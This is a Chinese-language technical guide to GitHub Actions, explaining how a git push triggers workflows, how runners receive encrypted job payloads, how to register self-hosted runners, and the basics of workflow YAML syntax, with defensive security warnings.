---
tags:
  - cicd
  - devops
  - github
created: 2026-09-21
aliases:
  - GitHub Actions
  - GitHub Workflow
  - GitHub 自动化构建
---

# GitHub Actions 完全指南

## 概述

你在本地敲下 `git push`，几秒钟后浏览器里的 GitHub 页面出现一个橙色小圆点，然后变绿——你的代码在没有你参与的情况下被拉取、装依赖、编译、测试、打包、发布到了服务器上。

这个过程看起来像魔法，但它的每一层都是可以被拆开的：`push` 在协议层做了什么、GitHub 服务端如何把"某个 ref 变了"变成一个事件、它读取哪个 commit 里的配置文件、任务被加密后送到哪台机器上执行、产物又存到了哪里。

本文沿着**一条真实的推送链路**自底向上拆解 GitHub Actions，最后落到"如何给我自己的项目加上自动构建和自动发布"的实操。

> [!note] 版本说明
> 本文核对日期为 **2026-09-21**。文中 action 版本号取自 GitHub Release API 当日最新，与官方文档示例可能有出入——官方文档的示例代码通常滞后一到两个大版本。写 workflow 时请以 [github/actions](https://github.com/actions) 各仓库的 README 为准。

## 前置知识

- [[frp-nginx-networking-guide]] —— webhook 本质是一次 HTTPS POST，理解 TLS 与 HTTP 语义有助于理解事件投递
- Git 基础：commit / tree / blob / ref / branch / tag 的对象模型，以及 `git push` 的传输过程
- 基本的 YAML 语法（缩进敏感、不支持 Tab）

---

## 一、起点：没有 CI/CD 的世界

### 1.1 手工流程长什么样

先看一个真实的例子。这个知识库仓库当前的部署流程（摘自仓库 README）是这样的：

```
① 本地修改文档
② git push 到 GitHub
③ SSH 登录物理机
④ cd /home/yj/code/yj-knowledge-bank && git pull
⑤ sudo systemctl restart yj-knowledge-bank
⑥ 打开浏览器，手动确认页面正常
```

这条流水线**能跑**，而且对一个人维护的小项目来说，甚至是合理的选择。但它把"如何构建和发布"这件事编码在了人的记忆里，而不是编码在仓库里。

### 1.2 手工流程的问题

| 问题 | 具体表现 |
|------|----------|
| **不可复现** | 第 ④ 步依赖"物理机上正好装好了 Node 18"。换台机器就崩，且没人记得清到底装了什么 |
| **无人执行** | 周末推的代码，周一才想起来部署。忘记部署的版本和已部署的版本不一致 |
| **无记录** | 上周三部署的是哪个 commit？出的问题是哪个版本引入的？没有系统性答案 |
| **无验证** | 一个坏掉的链接、一段跑不通的脚本，直到用户点开页面才发现 |
| **凭证散落** | SSH 私钥在你本地、服务器密码在笔记里、部署脚本散落在 shell history |
| **无法协作** | 别人想贡献代码，得先问你"改完怎么测" |
| **顺序耦合** | 必须在正确的目录、以正确的用户、在正确的时机执行，顺序错了就出问题 |

核心矛盾就一句话：**流程存在于人的脑子里，而代码存在于版本库中，两者没有绑定。**

### 1.3 CI / CD / CD 三个词的辨析

这三个缩写经常被混用，但含义不同：

| 术语 | 英文 | 含义 | 边界在哪 |
|------|------|------|----------|
| **持续集成** | Continuous Integration (CI) | 每次代码变更后**自动构建并验证**，尽早发现集成错误 | 止于"验证通过"，不涉及发布 |
| **持续交付** | Continuous Delivery | 在 CI 基础上，**始终保证有一个可发布版本**，但发布动作由人点击 | 止于"随时可发布"，发布仍需手动确认 |
| **持续部署** | Continuous Deployment | 验证通过后**自动发布到生产环境**，无需人工干预 | 无人值守 |

```
代码提交 ──► 构建 ──► 测试 ──► 打包 ──► 部署到预发 ──► 部署到生产
              │        │        │           │              │
              └────────┴────────┴───────────┘              │
                        CI（集成）                  ────────┘
                                               持续交付需人工点这一下
                                               持续部署自动走完
```

**实践建议**：从 CI 开始（收益最高、风险最低），再逐步加自动部署。对个人项目，"打 tag 自动发布"往往是性价比最高的一步。

### 1.4 范式转移：把流水线写成代码

CI 系统的核心思想是 **Pipeline as Code**——流水线的定义和源代码躺在同一个仓库里，跟着代码一起 review、一起版本化、一起回滚。

这条思想在演进中产生了三代方案：

| 代际 | 代表 | 流水线定义在哪 | 调度模型 |
|------|------|----------------|----------|
| 第一代 | Jenkins | 自建 master 机器上的 `Jenkinsfile` | 自己维护 master/agent，自己付服务器钱 |
| 第二代 | GitLab CI / Travis | 仓库内的 `.gitlab-ci.yml` | 平台托管 runner |
| 第三代 | GitHub Actions | 仓库内的 `.github/workflows/*.yml` | 平台托管调度器 + runner 池 + **可复用组件市场** |

GitHub Actions 相对前两代的关键差异有两点：

1. **完全事件驱动**。不只是"push 后跑流水线"，而是仓库上发生的**任何事**（开 issue、发评论、打 tag、发 release、定时）都能触发工作流。
2. **action 市场**。把"装 Node""登录 Docker Registry""发通知"这些步骤封装成可引用的组件，`uses: actions/setup-node@v7` 一行搞定，不用自己写脚本。

---

## 二、第一性原理：任何 CI 系统必须回答的四个问题

抛开具体产品，任何一个"自动构建系统"都绕不开四个问题。理解了这四个问题，你就能把任何 CI 系统（Jenkins、GitLab CI、CircleCI、GitHub Actions）映射到同一张地图上。

```
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│   ① 什么时候跑？        ─────►  触发       Trigger            │
│                                                              │
│   ② 在哪里跑？          ─────►  环境       Runner             │
│                                                              │
│   ③ 跑什么？            ─────►  流水线     Pipeline           │
│                                                              │
│   ④ 结果去哪？          ─────►  产物/回传   Artifact/Status   │
│                                                              │
└──────────────────────────────────────────────────────────────┘
         ▲                                              │
         │              ⑤ 用什么身份跑？                 │
         └──────────────  凭证 Credential  ◄─────────────┘
```

第二张图补充了第五个问题——**用什么身份去访问外部系统**（拉私有依赖、推镜像、连服务器）。这个问题在 GitHub Actions 里对应 `GITHUB_TOKEN`、Secrets 和 OIDC。

### 2.1 四个问题在各系统中的映射

| 问题 | GitHub Actions | GitLab CI | Jenkins | 本地手工 |
|------|----------------|-----------|---------|----------|
| ① 触发 | `on:` | `rules:` / `only:` | Webhook / 轮询 SCM | 你的大脑 |
| ② 环境 | `runs-on:` | `tags:` + runner | Agent 节点 | 你的笔记本 |
| ③ 流水线 | `jobs` / `steps` | `stages` / `script` | `Jenkinsfile` | shell 脚本 |
| ④ 产物 | artifacts / checks / releases | `artifacts:` | 归档 + 插件 | 复制到服务器 |
| ⑤ 凭证 | `GITHUB_TOKEN` / Secrets / OIDC | CI Variables | Credentials 插件 | ~/.ssh 和 .env |

**这张表就是本文的目录。** 接下来四章依次展开 ①~④，第八章展开 ⑤。

### 2.2 为什么 GitHub Actions 的"触发"是难点

其他四个问题在其他系统里也有，只有"触发"这一块 GitHub Actions 做得最细——因为它把 Git 服务端和 CI 调度器合并在同一个系统里，所以能拿到**最原始、最细粒度的仓库事件**，而不需要靠轮询或 webhook 转发。

这也意味着：**理解 GitHub Actions 的触发链路，等于理解 GitHub 服务端的一部分工作原理。** 这是第四章的内容。

---

## 三、心智模型：五个核心概念

在写第一行 YAML 之前，先把五个概念的位置关系钉死。

### 3.1 层次结构

```
┌─────────────────────────────────────────────────────────────────┐
│  .github/workflows/ci.yml        ← 一个文件 = 一个 Workflow      │
│                                                                 │
│  ┌───────────────────────────┐   ┌───────────────────────────┐  │
│  │  Job A   (build)          │   │  Job B   (test)           │  │
│  │  ─────────────────────    │   │  ─────────────────────    │  │
│  │  运行在：一台 Ubuntu 机器  │   │  运行在：另一台 Ubuntu 机  │  │
│  │                           │   │                           │  │
│  │  Step 1  uses: checkout   │   │  Step 1  uses: checkout   │  │
│  │  Step 2  run: npm ci      │   │  Step 2  run: npm test    │  │
│  │  Step 3  run: npm build   │   │                           │  │
│  └───────────────────────────┘   └───────────────────────────┘  │
│              │                                ▲                 │
│              └──── needs: build ──────────────┘                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

Workflow  一个 YAML 文件定义的完整流水线
  Job     一次执行单元，独占一台机器，Job 之间默认并行且互相隔离
    Step  一条命令或一个 action，顺序执行，共享同一台机器的文件系统
```

### 3.2 五个概念的精确定义

| 概念 | 一句话 | 关键性质 |
|------|--------|----------|
| **Workflow** | 一个 `.github/workflows/*.yml` 文件 | 一个仓库可以有任意多个 workflow，各自独立触发 |
| **Job** | 一组 step 的集合，跑在**一台独立的机器**上 | 默认并行；默认**不共享文件系统**；有独立的生命周期 |
| **Step** | 一个 `run:` 命令或一个 `uses:` action | 顺序执行；**每个 `run` 是一个新的 shell 进程** |
| **Action** | 可复用的构建块（脚本的封装） | 三种类型：JS / Docker / Composite |
| **Runner** | 真正执行 job 的那台机器 | GitHub 托管（Azure VM）或自建（self-hosted） |

### 3.3 三个最容易踩的"隔离"陷阱

**陷阱一：Job 之间不共享文件系统**

job A 里 `npm run build` 生成的 `dist/`，在 job B 里是**不存在的**。要传递必须走 artifact（见第九章）。

**陷阱二：Step 之间不共享 shell 环境**

```yaml
steps:
  - run: export FOO=bar      # ← 这个变量在下一个 step 里不存在
  - run: echo $FOO           # ← 输出空字符串
```

每个 `run` 都是一次全新的 shell 启动。要跨 step 传递必须写进 `$GITHUB_ENV`（见 6.6）。

**陷阱三：`cd` 不会保留**

```yaml
steps:
  - run: cd subdir           # ← 下一个 step 还在仓库根目录
  - run: pwd                # ← 输出的是 workspace 根目录
```

正确做法是用 `working-directory`（见 6.4）。

> [!tip] 一句话记住
> **Job 是隔离的机器，Step 是顺序的命令。** 跨 Job 传数据靠 artifact，跨 Step 传数据靠 `$GITHUB_ENV`。

---

## 四、触发链路：从 git push 到 workflow 启动

这是全文最核心的一章。回答一个问题：**你本地的一次 `git push`，是怎么变成远端一台机器上的一条 `npm test` 命令的？**

整条链路有五步：

```
  你的电脑                                    GitHub 服务端
  ─────────                                   ─────────────
                                ┌──────────────────────────────────────────┐
  git push                      │                                          │
      │                         │   ① 接收对象 + 更新 ref                   │
      │  ① 传输对象与 ref 更新   │      refs/heads/main: a1b2c3 → d4e5f6    │
      └────────────────────────►│              │                           │
                                │              ▼                           │
                                │   ② 生成事件（事件总线）                   │
                                │      push 事件 { ref, before, after,     │
                                │                 commits[], pusher }      │
                                │              │                           │
                                │              ▼                           │
                                │   ③ 确定读取哪个 commit 的 workflow 文件   │
                                │              │                           │
                                │              ▼                           │
                                │   ④ 匹配 workflow 的 on: 过滤器           │
                                │              │                           │
                                │              ▼                           │
                                │   ⑤ 创建 workflow run，拆分 job 入队       │
                                └──────────────┬───────────────────────────┘
                                               │
                        长轮询（加密的 job 载荷）│
                                               ▼
                                        Runner (Azure VM)
                                        ./run.sh → npm test
```

### 4.1 第一步：git push 在协议层做了什么

`git push` 不是"上传文件"，它是一次**协商式的对象传输 + 引用更新**。以 HTTPS 或 SSH 承载的 `git-receive-pack` 服务为例：

```
客户端                                           GitHub
  │                                                │
  │  1. GET /info/refs?service=git-receive-pack    │
  │ ──────────────────────────────────────────────►│
  │ ◄──────────  远端当前所有 ref 及指向的 commit    │
  │                                                │
  │  2. POST /git-receive-pack                     │
  │     ① 客户端告知"我有哪些对象"（have/want 协商）│
  │     ② 服务端告知"我还缺哪些对象"                │
  │ ──────────────────────────────────────────────►│
  │     ③ 客户端打包缺失对象（PACK），压缩后上传     │
  │ ──────────────────────────────────────────────►│
  │                                                │
  │     ④ 客户端发送 ref 更新命令：                  │
  │        update refs/heads/main                  │
  │        old: a1b2c3...  new: d4e5f6...          │
  │ ──────────────────────────────────────────────►│
  │                                                │
  │                          ⑤ 服务端校验：          │
  │                             - 身份/权限          │
  │                             - fast-forward？    │
  │                             - 分支保护规则？      │
  │                             - 签名要求？          │
  │                                                │
  │                          ⑥ 写入 ref             │
  │                             refs/heads/main     │
  │                                  → d4e5f6...   │
  │ ◄──────────  报告每个 ref 的更新结果             │
```

关键认知：**GitHub 是在第 ⑥ 步之后才产生事件的。**

事件描述的不是"有个文件变了"，而是 **"某个 ref 从 A 变成了 B"**。这个视角的差异非常重要，它解释了后面的很多行为：

- 为什么 `on: push` 的 `paths` 过滤器要遍历 commits 才能算出哪些文件变了
- 为什么只推 tag 不推分支，`push` 事件也会触发（tag 也是一个 ref）
- 为什么强制推送（force push）会触发一次 `push` 事件，且 `before` 与 `after` 没有祖先关系
- 为什么删除分支也会触发 `push`（`after` 是全零 SHA）

### 4.2 第二步：服务端把 ref 更新变成事件

GitHub 服务端在 ref 更新后，会向内部事件总线投递一个事件。这个事件最终会被序列化成 JSON——**这就是你在表达式里能访问到的 `github.event`**。

```jsonc
// push 事件的载荷（节选，字段名与 github.event.* 一一对应）
{
  "ref": "refs/heads/main",              // github.ref
  "before": "a1b2c3...",                 // 推送前的 commit
  "after":  "d4e5f6...",                 // 推送后的 commit ← github.sha 就是它
  "created": false,                      // 是否是新建分支
  "deleted": false,                      // 是否是删除分支
  "forced":  false,                      // 是否是强制推送
  "compare": "https://github.com/.../compare/a1b2c3...d4e5f6",
  "commits": [                           // 这次推送包含的提交
    {
      "id": "d4e5f6...",
      "message": "docs: refine blog narratives",
      "author": { "name": "...", "email": "..." },
      "added":    ["doc/new.md"],        // ← paths 过滤器基于这三个字段
      "removed":  [],
      "modified": ["index.html"],
      "distinct": true
    }
  ],
  "head_commit": { /* 最后一个 commit 的完整对象 */ },
  "pusher": { "name": "chunyujin", "email": "..." },   // github.actor（注意区别）
  "repository": { "full_name": "chunyujin295/yj-knowledge-bank", ... },
  "sender": { "login": "chunyujin" }     // github.triggering_actor
}
```

> [!warning] 一个容易忽略的细节
> `github.actor` 是**推送者**（pusher），而 `github.triggering_actor` 才是**触发这次运行的人**。在 `workflow_dispatch` 手动触发、以及 `GITHUB_TOKEN` 触发的场景下，这两个值会不同。做审计日志时别用错。

**事件速率限制**：单个仓库每 10 秒最多产生 1500 个事件，每 10 秒最多排队 500 个 workflow run（一个包含 30 个 reusable workflow 的调用树算作 1 个）。正常开发推送远达不到这个量级，但如果用脚本批量推几千个 tag，就要留意了。

### 4.3 第三步：读取哪个 commit 里的 workflow 文件？

这是整个模型里**最反直觉、也最容易导致安全问题**的一步。

GitHub 需要执行 `.github/workflows/*.yml`，但仓库历史里有无数个版本的这个文件。它读哪一个？

| 触发事件 | workflow 文件来自哪个 commit | `GITHUB_SHA` / `github.sha` |
|----------|------------------------------|------------------------------|
| `push` | **被推送的那个 commit** | 推送后的 commit（`after`） |
| `pull_request` | **PR 的合并提交**（`refs/pull/N/merge`，即 base + PR 改动的临时合并结果） | 该合并 commit |
| `pull_request_target` | **base 仓库的默认分支** | base 仓库默认分支的最后一个 commit |
| `schedule` | 默认分支 | 默认分支最后一个 commit |
| `workflow_dispatch` | 默认分支（文件不存在于默认分支时，UI 上连按钮都不会出现） | 默认分支最后一个 commit |
| `release` / `issues` / `issue_comment` | 默认分支 | 默认分支最后一个 commit |
| `workflow_run` | 默认分支 | 默认分支最后一个 commit |
| `workflow_call` | 调用方的 commit | 继承调用方 |

**为什么这件事重要？** 因为它决定了"谁能控制你的 workflow 内容"。

- `push`：只有能推送的人才改得动 workflow，天然可信。
- `pull_request`：workflow 文件取自合并提交，**PR 里的 workflow 改动会生效**。但平台有兜底——来自 fork 的 PR，secrets 一律不下发、`GITHUB_TOKEN` 强制降级为只读，且 `permissions:` 无法把它提权回来。
- `pull_request_target`：workflow 文件取自**受信任的默认分支**，因此可以拿到 secrets 和可写 token。这个特性是设计给"给 PR 打标签/发评论"这类不需要 checkout 代码的场景的——**一旦你去 checkout 了 PR 里的代码并执行，就等于把 secrets 交给了陌生人**。详见 8.5。

### 4.4 第四步：事件匹配 workflow 的 `on:` 过滤器

拿到事件和 workflow 文件后，GitHub 逐个检查每个 workflow 的 `on:` 是否匹配。

```yaml
on:
  push:                          # 事件名
    branches: [main, 'release/*']  # 分支过滤器
    paths:                         # 路径过滤器
      - 'doc/**'
      - '!doc/**/*.draft.md'       # 前缀 ! 表示排除（后面的规则优先）
    tags-ignore: ['v*-alpha']      # tag 过滤器
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
```

**四个必须知道的语义细节：**

**① `branches` 和 `paths` 同时存在时是 AND 关系，不是 OR。**

```yaml
on:
  push:
    branches: [main]
    paths: ['src/**']
```
含义是"推到 main **且** 这次推送改了 src 下的文件"，不是"推到 main **或** 改了 src"。想让两个条件各自触发，得写两个独立的 `on` 分支或两个 workflow。

**② `paths` 的判断依据是本次推送的 commits 列表。**

GitHub 汇总所有 commit 的 `added` / `removed` / `modified` 字段去匹配 glob。所以：
- 推送一个没有文件变化的 commit（比如 `git commit --allow-empty`），`paths` 永远不会命中。
- 推送 3 个 commit，其中任意一个改了 `src/`，`paths: ['src/**']` 就会命中。

**③ glob 语法有坑：`*` 不跨 `/`。**

| 模式 | 匹配 | 不匹配 |
|------|------|--------|
| `doc/*.md` | `doc/a.md` | `doc/ai/b.md` |
| `doc/**` | `doc/ai/b.md`、`doc/a.md` | — |
| `**.js` | 任意层级的 `.js` | — |
| `!doc/vendor/**` | （排除） | — |

以 `*` 或 `!` 开头的模式**必须加引号**，否则 YAML 会把 `*` 当别名、把 `!` 当标签解析，直接报错。

**④ 事件还分「活动类型」（activity types）。**

`push` / `schedule` 只有一种类型；但 `pull_request` 有 `opened`、`synchronize`（PR 有新提交）、`reopened`、`closed`、`labeled`、`ready_for_review` 等等。不写 `types:` 时只用默认的三种（`opened`/`synchronize`/`reopened`）——这就是为什么"PR 被合并不触发 CI"是常见困惑。

如果 workflow 文件本身有语法错误（YAML 缩进、未知字段、`uses` 引用了不存在的 action），这个 workflow **不会启动**，且错误只会显示在 Actions 页面的顶部提示里，不会给你发通知。这是"我推了代码但什么都没发生"的第一大原因。

### 4.5 第五步：创建 run、拆分 job、入队调度

匹配成功后，GitHub 创建一个 **workflow run**，然后：

1. **构建 DAG**。根据 `needs:` 关系把 job 排成有向无环图。没有 `needs` 关系的 job 之间没有边，可以并行。
2. **逐个 job 找 runner**。对每个 job，服务端按 `runs-on` 的标签在 runner 池里挑一台匹配的机器。
3. **入队等待**。如果暂时没有空闲 runner（或并发配额已满），job 停在 `Queued` 状态。UI 上你会看到黄色圆点。

```
workflow run 创建
        │
        ├──► job: build ──► 找 ubuntu-latest ──► 有空闲？ ──是──► 派发
        │                                            │
        │                                           否
        │                                            ▼
        │                                         排队 Queued
        │
        └──► job: test ───► needs: build ──► 等待 build 完成 ──► 再走上面的流程
```

并发上限取决于套餐（Free 20 / Pro 40 / Team 60 / Enterprise 500，其中 macOS 单独限 5）。超出后 job 排队，**不会失败**，但会一直等到有额度。

---

## 五、Runner：任务究竟跑在哪里

第四步结束时，job 还在 GitHub 的服务器上排队。它必须被送到一台真实的机器上执行。这一章讲这台机器从哪来、怎么接到任务、怎么把结果传回来。

### 5.1 GitHub 托管 runner 的真相

当你写 `runs-on: ubuntu-latest` 时，实际发生的是：

```
GitHub 调度器
      │  "给我一台打了 ubuntu-24.04 标签的机器"
      ▼
Azure 虚拟机池
      │  启动一台预装了 runner 应用的 VM
      │  （runner 应用是 Azure Pipelines Agent 的一个 fork）
      ▼
┌──────────────────────────────────────────┐
│  Azure VM   4 vCPU / 16 GB RAM / 14 GB   │
│  ┌────────────────────────────────────┐  │
│  │ actions/runner  (~/actions-runner) │  │
│  │  ├── bin/Runner.Listener           │  │
│  │  └── bin/Runner.Worker             │  │
│  ├────────────────────────────────────┤  │
│  │ /home/runner/work/<repo>/<repo>     │  │  ← 你的 GITHUB_WORKSPACE
│  │   └── 你 checkout 下来的代码          │  │
│  └────────────────────────────────────┘  │
│  预装工具链：Node / Python / Go / Java /  │
│  Docker / gcc / cmake / git / gh ...     │
└──────────────────────────────────────────┘
      │  job 结束
      ▼
   销毁整个 VM（对用户透明）
```

几个关键事实：

- **每台机器只跑一个 job**。job 结束后 VM 被销毁，下一个 job 拿到的是全新实例。这解决了"环境漂移"问题——但也意味着**任何没被缓存的下载都要重来**（这正是 cache 存在的理由）。
- **标准配置是 4 vCPU / 16 GB / 14 GB SSD**（公开仓库），arm64 Linux 同样规格；**私有仓库是 2 vCPU / 8 GB**，价格相同但算力减半。
- **macOS runner 是 3 核 M1 / 7 GB**，比 Linux 弱得多，但价格贵 10 倍（$0.062/分钟），并且有"macOS 并发上限 5"的硬约束。
- **`ubuntu-slim`** 是新出现的低成本选项：1 vCPU / 5 GB 的**容器**（不是 VM），作业超时只有 15 分钟，无特权（不能用 Docker-in-Docker、不能挂载文件系统）。适合跑轻量的 lint 和脚本。
- Linux / macOS runner 有**免密 sudo**，Windows runner 以管理员身份运行且关闭 UAC——这也是"不要把公开仓库的 runner 当安全边界"的原因之一。
- 关于 macOS 机器放在哪：runner 参考页写的是"GitHub 自有的 macOS 云"，概念页写的是"Azure 数据中心"。**官方文档自身措辞不一致**，本文不做断言。
- 你**无法 SSH 进托管 runner**（它不对公网开放入站连接）。要在里面交互式调试只能靠 `tmate` 之类的 action 反向连出来。

### 5.2 Runner 如何领到任务：长轮询 + 载荷加密

这一段是理解 GitHub Actions 安全模型的关键，也是最容易被忽略的工程细节。

**问题**：job 载荷里包含 `GITHUB_TOKEN`（一个可写你仓库的临时令牌）。如果 runner 只是"从某个 URL 拉一个明文 JSON"，那么任何能劫持这条链路的人都能拿到令牌——哪怕走的是 HTTPS，也得信任链路上的每一跳。

**解法**：在应用层再加一层端到端加密，密钥只有 GitHub 和这台 runner 知道。

```
Runner 注册时（config.sh 阶段）
  ├─ 本地生成 RSA 密钥对
  ├─ 私钥存在 .credentials_rsaparams（只在本机）
  └─ 公钥（modulus + exponent）上传给服务端注册

运行时（每个 job）
  GitHub Actions 服务                        Runner
        │                                       │
        │ ① 建会话，返回 Session.EncryptionKey    │
        │    = AES 会话密钥，用 runner 公钥加密    │
        │    （字段 EncryptionKey.Encrypted=true）│
        ├──────────────────────────────────────►│
        │                                       │ ② 用 RSA 私钥解密出 AES 密钥
        │                                       │    （OAEP-SHA256；FIPS 模式下强制）
        │ ③ 长轮询 GetRunnerMessageAsync          │
        │ ◄──────────────────────────────────────┤
        │                                       │
        │ ④ 返回加密的 job 载荷                    │
        │    （AES 加密的 body，base64 + 每消息 IV）│
        ├──────────────────────────────────────►│
        │                                       │ ⑤ AES 解密
        │                                       │    拿到：job 定义、环境变量、
        │                                       │    GITHUB_TOKEN、workspace 路径
        │                                       │
        │                                       │ ⑥ 执行 steps，流式回传日志
        │ ◄──────────────────────────────────────┤
        │                                       │
```

几个值得记住的点：

- 长轮询（long poll）意味着 runner **主动**向 GitHub 建立一条长时间挂起的请求。它不需要对外暴露任何端口，所以托管 runner 能在 NAT 后面工作。
- 现在存在**两代协议**：旧的 `RunnerServer` 和新的 `BrokerServer`。服务端可以在会话中下发 `BrokerMigrationMessage`，让 runner 切换到 broker 端点。这是渐进式迁移。
- 会话有看门狗：如果 30 分钟内没取到任何消息，会话会被判定失效。
- 结论：**job 载荷是端到端加密到具体那台 runner 的**，不只是靠 TLS 保护。这是"为什么 GitHub 敢把 token 放进 job 里"的答案。

### 5.3 `runs-on` 的标签匹配规则

`runs-on` 不是"选操作系统"，而是**标签匹配**：

```yaml
# 以下三种写法任选其一（同一个 job 里只能写一个 runs-on）

runs-on: ubuntu-latest              # 单个标签
runs-on: [self-hosted, linux, gpu]  # 多个标签 → AND 关系（必须同时满足）
runs-on: ${{ matrix.os }}           # 可以是表达式
```

| 标签 | 含义 |
|------|------|
| `ubuntu-latest` / `ubuntu-24.04` / `ubuntu-26.04` / `ubuntu-22.04` | GitHub 托管的 Linux x64 |
| `ubuntu-24.04-arm` | GitHub 托管的 Linux arm64 |
| `windows-latest`（= 2025）/ `windows-2022` | GitHub 托管的 Windows |
| `macos-latest`（= macos-26）/ `macos-15` / `macos-26-intel` | GitHub 托管的 macOS |
| `ubuntu-slim` | 1 核容器 runner，15 分钟超时 |
| `self-hosted` | 自建 runner |

> [!warning] `-latest` 的陷阱
> `ubuntu-latest` 指的是"GitHub 提供的最新**稳定**镜像"，不是"厂商最新 OS"。它的指向会随时间变化（曾经从 20.04 漂到 22.04 再漂到 24.04），**某天你的构建可能因为底层镜像换版而失败**。对稳定性要求高的项目，固定 `ubuntu-24.04` 这样的具体版本更安全。

### 5.4 Self-hosted runner：把机器接到 GitHub 上

当你需要内网资源、特殊硬件、GPU、或者想省钱时，可以把自己的机器注册成 runner。

**注册流程：**

```bash
# ① 在 GitHub 仓库 → Settings → Actions → Runners → New self-hosted runner
#    页面会给出一个临时注册 token

# ② 在目标机器上
mkdir actions-runner && cd actions-runner
curl -o actions-runner.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
tar xzf actions-runner.tar.gz

# ③ 配置（--ephemeral 表示跑完一个 job 就注销，推荐用于自动扩缩容场景）
./config.sh --url https://github.com/chunyujin295/yj-knowledge-bank \
            --token <REGISTRATION_TOKEN> \
            --labels self-hosted,linux,deploy-target \
            --ephemeral

# ④ 安装为系统服务
sudo ./svc.sh install
sudo ./svc.sh start
```

然后在 workflow 里：

```yaml
jobs:
  deploy:
    runs-on: [self-hosted, deploy-target]
    steps:
      - run: echo "我在自己的机器上跑"
```

**必须知道的几点：**

| 事项 | 说明 |
|------|------|
| **版本要求** | `actions/runner` 最新为 v2.337.0。Node 24 的 action（`setup-node@v5+`、`setup-python@v6+`）要求 runner ≥ v2.327.1；checkout v6 的 Docker 容器 git 认证要求 ≥ v2.329.0 |
| **自动更新** | 默认开启。如果关掉，必须在 **30 天内**手动升级，否则 runner 会被拒绝服务 |
| **作业时长** | 自建 runner 单个 job 最长 **5 天**（托管是 6 小时）；但 `GITHUB_TOKEN` 自建 runner 上最长只有 **24 小时** |
| **排队超时** | 自建 runner 的 job 排队超过 **24 小时**会被自动取消 |
| **⚠️ 安全红线** | **绝对不要给公开仓库挂 self-hosted runner。** 任何人都能开 PR，而 PR 里的代码会在你的机器上执行——这条路径能直接打进你的内网 |

> [!danger] 关于自建 runner 的安全边界
> 自建 runner 等于"让 GitHub 上的陌生人有机会在你的机器上执行代码"。如果一定要给公开仓库用：
> - 设置仓库级别只允许**指定的人**触发 workflow（Settings → Actions → 勾选 "Require approval for all outside collaborators"）
> - 使用 `--ephemeral` 并且每次跑完销毁容器/VM
> - **永远不要给这台机器任何长期有效的凭证**
> - 最稳妥的做法是把它放进一个隔离的网络里，当作"不可信执行环境"对待

**Actions Runner Controller (ARC)** 是官方给出的 Kubernetes 方案，用于大规模自建：

```
① Helm 安装 controller manager，创建 AutoscalingRunnerSet
② Listener Pod 对 GitHub 开一条 HTTPS 长轮询，等 "Job Available"
③ 收到后 Listener 去 patch EphemeralRunnerSet 的 replicas
④ EphemeralRunnerSet 创建 Pod，通过 JIT 配置令牌注册 runner
   （失败的 Pod 最多重试 5 次；24 小时内没有 runner 接单则任务被收回）
⑤ runner 注册成功，领 job，执行，回传日志
⑥ 成功后 controller 询问服务端能否删除，然后销毁 Pod
```

ARC 只以 OCI 包的形式发布在 GHCR 上（`gha-runner-scale-set-controller` 和 `gha-runner-scale-set` 两个 chart），当前版本线是 `gha-runner-scale-set-0.14.x`。

### 5.5 与 Jenkins 的架构对比

理解了 GitHub Actions 的模型之后，和 Jenkins 对比会特别清晰：

| 维度 | Jenkins | GitHub Actions |
|------|---------|----------------|
| **调度器** | 自建 master 机器，你要维护它、备份它、给它打补丁 | GitHub 托管，零运维 |
| **执行器** | 自己准备 agent 机器，长期在线 | 平台按需开 Azure VM，用完即毁 |
| **流水线定义** | `Jenkinsfile`（Groovy DSL，图灵完备） | YAML（声明式，能力受限但更安全） |
| **复用机制** | 共享库（Shared Library），需要自己维护版本 | action 市场 + composite action + reusable workflow |
| **触发来源** | SCM 轮询 / webhook 插件（需要额外配置） | 内建，仓库上的任何事件都能触发 |
| **凭证管理** | Credentials 插件 + master 上的加密存储 | `GITHUB_TOKEN` + Secrets + OIDC |
| **隔离性** | 取决于你怎么配置 agent（常见做法是复用的） | 默认每个 job 一台干净机器 |
| **成本模型** | 机器固定成本（闲置也花钱） | 按分钟计费（公开仓库免费） |
| **可编程性** | 强（Groovy 能写任意逻辑） | 弱（YAML 里不能写复杂逻辑，只能拆进 action/脚本） |
| **本地方案** | 难 | `act`（重实现了一个 runner，不保证完全一致） |

> [!note] 一句话总结差异
> Jenkins 把复杂性交给你（你要维护调度器和 agent），换来的是完全的控制力；GitHub Actions 把调度器和执行环境都托管掉，换来的是简单，代价是"你只能用它允许的方式表达流水线"。

---

## 六、工作流文件语法完全解剖

前五章讲的是"为什么"，这一章讲"怎么写"。

### 6.1 一份最小可运行的工作流

```yaml
# .github/workflows/hello.yml
name: Hello World                    # ① workflow 的显示名

on: push                             # ② 触发条件：任何分支的任何推送

jobs:                                # ③ 一个或多个 job
  hello:                             #    job 的 id（同文件内唯一）
    runs-on: ubuntu-latest           # ④ 在哪台机器上跑
    steps:                           # ⑤ 按顺序执行的步骤
      - run: echo "Hello from $(uname -a)"      # 直接执行 shell 命令
```

把它放到仓库的 `.github/workflows/` 目录下推上去，Actions 页面就会出现一次运行。注意目录层级：**必须是 `.github/workflows/`**，多一层少一层都不会被识别，且这个目录**只能在默认分支上被发现**（`workflow_dispatch` 的按钮尤为明显——文件不在默认分支，连按钮都不给你）。

### 6.2 顶层字段

```yaml
name: CI                             # workflow 名称（UI 显示）
run-name: Deploy to ${{ inputs.env }} by @${{ github.actor }}   # 单次运行的名称
on: [push, pull_request]             # 触发条件
permissions:                         # 权限声明（见第八章）
  contents: read
env:                                 # 全局环境变量
  NODE_VERSION: '22'
defaults:                            # 所有 step 的默认值
  run:
    shell: bash
    working-directory: ./app
concurrency:                         # 并发控制
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
cache-mode: write                    # 缓存写入策略（新字段）
jobs: { ... }
```

| 字段 | 作用 | 注意 |
|------|------|------|
| `name` | workflow 名 | 显示在 UI 和 badges 上 |
| `run-name` | 单次运行的标题 | 只能用 `github` 和 `inputs` 两个上下文 |
| `on` | 触发条件 | 详见 4.4 |
| `permissions` | 权限声明 | **列了任何一个 scope，其余全部变成 `none`** |
| `env` | 全局环境变量 | 会传给所有 job 和 step |
| `defaults.run.working-directory` | 默认工作目录 | 省去每个 step 写 `cd` |
| `concurrency` | 并发组 | 同组内互斥 |
